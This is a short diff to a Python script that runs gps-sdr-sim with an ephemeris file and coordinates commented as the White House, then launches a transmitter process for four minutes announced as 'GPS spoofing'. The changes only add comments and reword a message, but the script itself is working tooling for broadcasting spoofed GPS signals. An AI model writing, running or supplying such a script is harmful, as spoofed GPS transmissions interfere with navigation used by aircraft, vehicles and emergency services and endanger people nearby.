@@ -5,8 +5,8 @@ from datetime import datetime
 
 # Current directory setup
 binary_path = "./gps-sdr-sim"
-ephemeris_file = "brdc0480.25n"
-location = "38.8976633,-77.0365739,100"
+ephemeris_file = "brdc0480.25n" # downloaded from NASA website
+location = "38.8976633,-77.0365739,100" # location of White House, can change
 duration_seconds = 240  # 4 minutes
 
 try:
@@ -16,7 +16,7 @@ try:
     # Generate gpssim.bin
     subprocess.run(
         [binary_path, "-b", "8", "-e", ephemeris_file, "-l", location],
-        stdout=subprocess.DEVNULL,
+        stdout=subprocess.DEVNULL, # not printing out any context for running this command
         stderr=subprocess.DEVNULL,
         check=True
     )
@@ -31,11 +31,11 @@ try:
         "-x", "0"
     ]
 
-    print("Starting GPS spoofing transmission for 4 minutes...")
+    print("Starting GPS spoofing for 4 minutes...")
 
     process = subprocess.Popen(transmit_command)
 
-    time.sleep(duration_seconds)
+    time.sleep(duration_seconds) # waiting for 4 mins
 
     # Stop the transmission
     process.send_signal(signal.SIGINT)
